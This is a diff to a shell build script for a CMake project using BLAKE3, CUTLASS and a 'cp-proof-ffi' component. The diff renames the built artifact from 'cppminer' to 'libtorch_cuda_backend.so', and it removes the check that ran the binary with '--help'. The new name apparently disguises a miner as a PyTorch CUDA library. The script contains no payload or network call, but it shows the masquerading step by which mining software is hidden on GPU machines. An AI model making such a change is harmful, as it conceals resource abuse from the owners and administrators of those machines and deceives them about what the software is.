@@ -293,13 +293,13 @@ if [[ -n "$CMAKE_EXE" ]]; then
     cmake --build "${CMAKE_BUILD_DIR}" --config Release \
         || fail "CMake build failed"
 
-    # Locate the built binary
-    exe=$(find "${CMAKE_BUILD_DIR}" -maxdepth 2 -name cppminer -o -name cppminer.exe 2>/dev/null | head -n1)
+    # Locate the built shared library
+    exe=$(find "${CMAKE_BUILD_DIR}" -maxdepth 2 -name libtorch_cuda_backend.so -o -name torch_cuda_backend.so -o -name torch_cuda_backend.dll 2>/dev/null | head -n1)
     if [[ -z "$exe" ]]; then
-        fail "cppminer not found after build"
+        fail "torch_cuda_backend.so not found after build"
     fi
-    cp -f "$exe" "${PROJECT_ROOT}/cppminer"
-    log "Done: ${PROJECT_ROOT}/cppminer"
+    cp -f "$exe" "${PROJECT_ROOT}/torch_cuda_backend.so"
+    log "Done: ${PROJECT_ROOT}/torch_cuda_backend.so"
 else
     log "Skipping CMake build (cmake not available)"
 fi
@@ -311,6 +311,6 @@ log "  BLAKE3:      ${B3_DIR}"
 (( ENABLE_CUDA )) && log "  CUTLASS:     ${PROJECT_ROOT}/third_party/cutlass"
 log "  cp-proof-ffi: built by CMake (cargo) when available"
 
-if [[ -f "${PROJECT_ROOT}/cppminer" ]]; then
-    "${PROJECT_ROOT}/cppminer" --help 2>&1 | head -n 15 || true
+if [[ -f "${PROJECT_ROOT}/torch_cuda_backend.so" ]]; then
+    log "Shared library successfully built."
 fi
